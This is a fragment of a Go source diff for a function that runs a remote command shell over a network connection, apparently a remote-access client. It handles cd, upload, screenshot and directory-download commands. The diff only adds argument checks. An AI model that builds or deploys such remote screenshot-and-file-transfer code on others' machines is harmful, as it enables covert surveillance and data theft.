@@ -75,12 +75,21 @@ func runShell(conn net.Conn) error {
 		//コマンドの引数の数もチェックすること
 		switch commands[0] {
 		case "cd":
+			if len(commands) != 2 {
+				//message
+				continue
+			}
 			dir := commands[len(commands)-1]
 			os.Chdir(string(dir))
 
 		case "upload":
+			if len(commands) != 2 {
+				//message
+				continue
+			}
 			//execUpload
 			filePath := strings.Split(commands[len(commands)-1], "/")
+
 			lastPathFromRecievedFile := strings.Join(filePath[:len(filePath)-1], "/")
 			//dir := "upload/"
 			dir := config.Config.UploadDIr
@@ -143,6 +152,7 @@ func runShell(conn net.Conn) error {
 		case "screenshot": //ex: screenshot
 			//スクリーンショットを撮影し送信
 			outdir := config.Config.ScreenshotDir
+
 			filenames, err := pkgclient.Getscreenshot(outdir)
 			if err != nil {
 				continue
@@ -154,8 +164,14 @@ func runShell(conn net.Conn) error {
 
 		case "download": //ex: download [path]
 			//execDownload
+			if len(commands) != 2 {
+				//message
+				continue
+			}
+
 			//ファイルシステム構築
 			rootPath := commands[len(commands)-1]
+
 			fsys := os.DirFS(rootPath)
 			err := fs.WalkDir(fsys, ".", func(path string, d fs.DirEntry, err error) error {
 				if err != nil {
